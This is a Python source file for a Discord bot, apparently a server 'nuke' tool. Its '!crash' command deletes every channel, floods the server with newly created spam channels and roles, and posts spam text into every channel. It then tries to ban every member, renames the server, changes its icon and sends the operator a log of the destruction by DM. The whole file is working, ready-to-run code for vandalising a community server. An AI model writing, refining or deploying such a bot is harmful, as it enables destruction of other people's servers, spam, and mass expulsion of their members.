import os
import disnake
from disnake.ext import commands
from logger import log, create
from dotenv import load_dotenv

load_dotenv()

loglist = []

TOKEN=os.getenv("TOKEN")
UNITED_NAME=os.getenv("UNITED_NAME")
SPAM_TEXT=os.getenv("SPAM_TEXT")
UNITED_COUNTER=int(os.getenv("UNITED_COUNTER"))

log("VARIABLES: GOT", loglist)

client = commands.Bot(
    command_prefix="!", 
    help_command=None, 
    intents=disnake.Intents.all()
)

@client.event
async def on_ready():
    log("BOT:       LAUNCHED", loglist)

@client.command()
async def crash(ctx):
    banlist = []
    guild = ctx.guild

    for channel in guild.channels:
        await channel.delete()
        log(f"CHANNEL:   {channel.name} - DELETED",loglist)

    for create_channel in range(UNITED_COUNTER):
        await guild.create_text_channel(UNITED_NAME)
        log(f"CHANNEL:   {UNITED_NAME} - CREATED", loglist)

    for spam_channel in range(UNITED_COUNTER):
        for channel in guild.channels:
            await channel.send(SPAM_TEXT)
            log(f"CHANNEL:   {channel.name} - SPAMMED", loglist)

    for spam_role in range(UNITED_COUNTER):
        await guild.create_role(name=UNITED_NAME)
        log(f"ROLE:      {UNITED_NAME} - CREATED", loglist)

    for member in guild.members:
        tag = member.name
        id = member.id
        try:
            await ctx.guild.ban(member, reason=UNITED_NAME)
            log(f"BAN:       {tag} [{id}] - BANNED",loglist)
        except disnake.Forbidden:
            log(f"BAN:       {tag} [{id}] - MISTAKE",loglist)
        except Exception as e:
            log(f"BAN:       {tag} [{id}] - {e}",loglist)
    
    avatar = open('avatar.png', 'rb')
    avat4r = avatar.read()
    await guild.edit(name=UNITED_NAME,icon=avat4r)
    log(f"SERVER:    NAME & ICO - CHANGED",loglist)
    avatar.close()
    
    create(loglist)
    await ctx.author.send("log", file=disnake.File("loglist.txt"))
    os.remove("loglist.txt")

    print("Log sent to your DM")


client.run(TOKEN)